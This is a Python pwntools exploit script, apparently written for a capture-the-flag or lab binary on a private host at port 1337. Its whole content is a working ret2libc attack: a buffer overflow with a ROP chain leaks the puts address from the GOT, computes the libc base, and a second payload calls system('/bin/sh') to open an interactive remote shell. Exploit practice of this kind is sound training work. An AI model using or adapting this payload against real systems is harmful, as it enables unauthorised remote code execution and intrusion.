from pwn import *

TARGET = "./target"
OFFSET = cyclic_find(0x64616170)

#LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
LIBC = "./remoteLib"

thisElf = ELF(TARGET)
COPY = thisElf.sym["copy"]


#getting gadgets
thisRop = ROP(thisElf)
POP_RDI = thisRop.find_gadget(["pop rdi"])[0]
RET = thisRop.find_gadget(["ret"])[0]  

#log info to show locations of gadgets
log.info("Pop RDI is 0x%x", POP_RDI)
log.info("Pop RET is 0x%x", RET)

PUTS_PLT = thisElf.plt['puts']
PUTS_GOT = thisElf.got['puts'] 

libcElf = ELF(LIBC)
LIBC_PUTS = libcElf.sym["puts"]

#---start process to get libc
#------start process attach gdb

#p = process(TARGET)
p = remote("192.168.198.130", 1337)
#pause()


payload = b'A'* OFFSET
payload += p64(POP_RDI)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT) 
payload += p64(COPY) 

p.writeline(payload) 

out = p.readuntil(b"Read\n")
address = p.readline() 
log.info("Output %s", address)
log.hexdump(address)

leakVal = u64(address.rstrip().ljust(8,b"\x00"))
log.info("Leaked Value is %x", leakVal)

LIBC_BASE = leakVal - LIBC_PUTS
log.info ("LibC base %x", LIBC_BASE)

#-----------

libcElf.address = LIBC_BASE 

SYSTEM = libcElf.sym["system"]
SH = next(libcElf.search(b"/bin/sh"))

log.info("system:  %s", hex(SYSTEM))
log.info ("bin/sh/ : %s", hex(SH))


#Write Payload
payload = b'A'* OFFSET
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(SH)
payload += p64(SYSTEM)


p.writeline(payload)
p.interactive()